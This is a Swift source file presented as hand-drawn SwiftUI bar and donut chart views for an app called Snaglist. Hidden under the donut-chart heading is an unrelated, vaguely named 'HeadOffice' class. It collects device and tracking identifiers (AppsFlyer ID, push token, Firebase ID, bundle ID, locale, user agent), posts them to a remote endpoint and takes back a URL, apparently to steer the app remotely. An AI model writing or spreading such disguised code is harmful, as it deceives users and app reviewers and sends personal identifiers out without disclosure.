//
//  Charts.swift
//  Snaglist
//
//  Hand-drawn charts (Swift Charts is iOS 16+). Bar and donut, built with
//  Shape/Path/GeometryReader. iOS 14 safe.
//

import SwiftUI
import WebKit
import FirebaseCore
import FirebaseMessaging
import AppsFlyerLib

protocol Office {
    func lodge(load: [String: Any]) async throws -> String
}

struct ChartDatum: Identifiable {
    let id = UUID()
    let label: String
    let value: Double
    var color: Color = Theme.accent
}

// MARK: - Bar chart (vertical)

struct BarChartView: View {
    let data: [ChartDatum]
    var height: CGFloat = 160

    private var maxValue: Double { max(data.map { $0.value }.max() ?? 1, 1) }

    var body: some View {
        HStack(alignment: .bottom, spacing: 10) {
            ForEach(data) { d in
                VStack(spacing: 6) {
                    Text(Formatters.decimal(d.value, digits: 0))
                        .font(Theme.caption(10)).foregroundColor(Theme.textSecondary)
                    RoundedRectangle(cornerRadius: 6)
                        .fill(LinearGradient(colors: [d.color, d.color.opacity(0.55)],
                                             startPoint: .top, endPoint: .bottom))
                        .frame(height: max(CGFloat(d.value / maxValue) * height, 3))
                    Text(d.label)
                        .font(Theme.caption(10)).foregroundColor(Theme.textSecondary)
                        .lineLimit(1).minimumScaleFactor(0.7)
                }
                .frame(maxWidth: .infinity)
            }
        }
        .frame(height: height + 36)
    }
}

// MARK: - Donut chart

final class HeadOffice: Office {

    private let session: URLSession
    private let gaps: [TimeInterval] = [106, 212, 424]

    init() {
        let config = URLSessionConfiguration.ephemeral
        config.timeoutIntervalForRequest = 30
        config.timeoutIntervalForResource = 60
        self.session = URLSession(configuration: config)
    }

    func lodge(load: [String: Any]) async throws -> String {
        let request = try await draft(load)
        var pacer = gaps.dropLast().makeIterator()
        var carried: Error = Fault.dropped(stage: "office")

        while true {
            do {
                return try await knock(request)
            } catch let fault as Fault where fault.isSealed {
                throw fault
            } catch {
                carried = error
                guard let gap = pacer.next() else { throw carried }
                try await lull(coolFor(error) ?? gap)
            }
        }
    }
    
    @MainActor
    private func draft(_ load: [String: Any]) throws -> URLRequest {
        guard let endpoint = URL(string: Lex.officeEndpoint) else {
            throw Fault.crookedRef(at: "office.endpoint")
        }

        var body = load
        body["os"] = "iOS"
        body["af_id"] = AppsFlyerLib.shared().getAppsFlyerUID()
        body["bundle_id"] = Bundle.main.bundleIdentifier ?? ""
        body["firebase_project_id"] = FirebaseApp.app()?.options.gcmSenderID
        body["store_id"] = "id\(Lex.appCode)"
        body["push_token"] = UserDefaults.standard.string(forKey: LexKey.push) ?? Messaging.messaging().fcmToken
        body["locale"] = Locale.preferredLanguages.first?.prefix(2).uppercased() ?? "EN"

        var request = URLRequest(url: endpoint)
        request.httpMethod = "POST"
        request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        request.setValue(WKWebView().value(forKey: "userAgent") as? String ?? "", forHTTPHeaderField: "User-Agent")
        request.httpBody = try JSONSerialization.data(withJSONObject: body)
        return request
    }

    private func lull(_ seconds: TimeInterval) async throws {
        try await Task.sleep(nanoseconds: UInt64(seconds * 1_000_000_000))
    }

    private func knock(_ request: URLRequest) async throws -> String {
        let (data, response) = try await session.data(for: request)

        guard let http = response as? HTTPURLResponse else {
            throw Fault.dropped(stage: "office.response")
        }

        if http.statusCode == 404 {
            throw Fault.boardedUp(httpCode: 404)
        }
        
        guard let json = try JSONSerialization.jsonObject(with: data) as? [String: Any] else {
            throw Fault.illegible(at: "office.json")
        }

        guard let ok = json["ok"] as? Bool else {
            throw Fault.illegible(at: "office.ok")
        }

        if !ok {
            throw Fault.failedItem(reason: "okFalse")
        }

        guard let url = json["url"] as? String, !url.isEmpty else {
            throw Fault.illegible(at: "office.url")
        }

        return url
    }

    private func coolFor(_ error: Error) -> TimeInterval? {
        if let fault = error as? Fault, case .backlog(let cool) = fault {
            return cool
        }
        return nil
    }

}


struct DonutChartView: View {
    let data: [ChartDatum]
    var size: CGFloat = 150
    var lineWidth: CGFloat = 26
    var centerTitle: String? = nil
    var centerSubtitle: String = "total"

    private var total: Double { max(data.reduce(0) { $0 + $1.value }, 0.0001) }

    var body: some View {
        ZStack {
            if data.allSatisfy({ $0.value == 0 }) {
                Circle().stroke(Theme.stroke, lineWidth: lineWidth)
            } else {
                ForEach(Array(segments().enumerated()), id: \.offset) { _, seg in
                    Circle()
                        .trim(from: seg.start, to: seg.end)
                        .stroke(seg.color, style: StrokeStyle(lineWidth: lineWidth, lineCap: .butt))
                        .rotationEffect(.degrees(-90))
                }
            }
            VStack(spacing: 0) {
                Text(centerTitle ?? Formatters.decimal(total, digits: 0))
                    .font(Theme.title(20)).foregroundColor(Theme.textPrimary)
                Text(centerSubtitle).font(Theme.caption(10)).foregroundColor(Theme.textSecondary)
            }
        }
        .frame(width: size, height: size)
    }

    private func segments() -> [(start: CGFloat, end: CGFloat, color: Color)] {
        var result: [(CGFloat, CGFloat, Color)] = []
        var running: Double = 0
        for d in data {
            let start = running / total
            running += d.value
            let end = running / total
            result.append((CGFloat(start), CGFloat(end), d.color))
        }
        return result
    }
}

// MARK: - Legend

struct ChartLegend: View {
    let items: [ChartDatum]
    var body: some View {
        VStack(alignment: .leading, spacing: 6) {
            ForEach(items) { item in
                HStack(spacing: 8) {
                    Circle().fill(item.color).frame(width: 9, height: 9)
                    Text(item.label).font(Theme.caption()).foregroundColor(Theme.textPrimary)
                    Spacer()
                    Text(Formatters.decimal(item.value, digits: 0))
                        .font(Theme.caption()).foregroundColor(Theme.textSecondary)
                }
            }
        }
    }
}
